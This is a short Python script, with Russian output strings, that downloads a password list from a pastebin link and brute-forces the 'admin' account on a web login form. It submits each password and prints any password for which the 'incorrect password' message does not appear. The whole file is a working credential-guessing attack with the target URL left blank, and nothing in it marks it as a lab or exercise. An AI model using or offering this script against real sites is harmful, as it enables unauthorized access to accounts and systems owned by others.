
import requests
url = ''
password_list = requests.get('https://pastebin.com/raw/UnVspbug').text

print('Начало циклов')

for password in password_list.split('\r\n'):
    
    resp = requests.post(url, data = {
        "UserLogin[username]": "admin",
        "UserLogin[password]": password,
        "UserLogin[rememberMe]": [
            "0",
            "1"
        ],
        "yt0": "Вход"
    })
    print('Длина ответа: {}'.format(len(resp.text)-len(password)))
    if "Неверный пароль." in resp.text:
        pass
        #print('Пароль не подошел: {}'.format(password))
    else:
        print('Пароль подошел: {}'.format(password))
